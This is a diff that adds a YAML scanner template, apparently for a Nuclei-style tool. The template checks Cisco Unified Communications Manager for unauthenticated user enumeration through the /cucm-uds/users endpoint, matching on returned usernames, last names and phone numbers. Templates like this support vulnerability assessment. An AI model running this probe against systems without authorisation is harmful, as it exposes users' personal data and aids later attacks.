@@ -1,0 +1,33 @@
+id: cucm-username-enumeration
+brief:
+    title: Cisco Unified Communications Manager - User Enumeration
+    by: manasmbellani
+    level: medium
+    about: Cisco Unified Call Manager is vulnerable to username enumeration. This template enumerates valid usernames and emails from the Cisco UCM UDS API.
+    label:
+        - cisco
+        - ucm
+        - enum
+        - users
+        - xml
+        - cucm
+        - unauth
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/cucm-uds/users'
+      head:
+        Accept: application/xml
+      signs:
+        - "on": status
+          status:
+            - 200
+        - "on": word
+          has:
+            - <users
+            - <userName>
+            - <lastName>
+            - <phoneNumber>
+          in: body
+          need: all
